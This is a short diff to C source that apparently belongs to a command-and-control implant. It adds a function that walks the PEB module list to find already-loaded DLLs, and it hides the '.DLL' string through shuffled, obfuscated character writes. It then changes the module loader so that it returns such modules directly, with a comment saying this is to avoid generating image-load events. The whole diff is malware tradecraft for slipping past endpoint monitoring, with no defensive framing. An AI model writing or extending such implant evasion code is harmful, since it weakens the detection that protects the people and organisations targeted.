@@ -157,6 +157,47 @@ PVOID LdrModulePebByString(
 }
 
 /*!
+ * Search for a DLL on the PEB module list
+ *
+ * @param ModuleName module name
+ * @return
+ */
+PVOID LdrModuleSearch(
+    IN LPWSTR ModuleName)
+{
+    PVOID                 FirstEntry  = NULL;
+    PLDR_DATA_TABLE_ENTRY Entry       = NULL;
+    WCHAR                 Name[ 260 ] = { 0 };
+    WCHAR                 Dll[ 5 ]    = { 0 };
+
+    Dll[ 3 ] = HideChar( 'L' );
+    Dll[ 1 ] = HideChar( 'D' );
+    Dll[ 4 ] = HideChar( '\0' );
+    Dll[ 2 ] = HideChar( 'L' );
+    Dll[ 0 ] = HideChar( '.' );
+
+    Entry      = Instance.Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    FirstEntry = &Instance.Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+
+    StringCopyW( Name, ModuleName );
+
+    if ( ! EndsWithIW( ModuleName, Dll ) )
+    {
+        StringConcatW( Name, Dll );
+    }
+
+    do
+    {
+        if ( ! StringCompareIW( Name, Entry->BaseDllName.Buffer ) ) {
+            return Entry->DllBase;
+        }
+        Entry = Entry->InLoadOrderLinks.Flink;
+    } while ( Entry != FirstEntry );
+
+    return NULL;
+}
+
+/*!
  * Load Library by string name.
  *
  * @note
@@ -189,6 +230,14 @@ PVOID LdrModuleLoad(
 
     /* get size of module unicode string */
     DestSize = StringLengthW( NameW ) * sizeof( WCHAR );
+
+    /* check if the module is already loaded */
+    Module = LdrModuleSearch( NameW );
+
+    /* if found, avoid generating an image-load event */
+    if ( Module ) {
+        return Module;
+    }
 
     /* if proxy module loading is enabled */
     if ( Instance.Config.Implant.ProxyLoading )
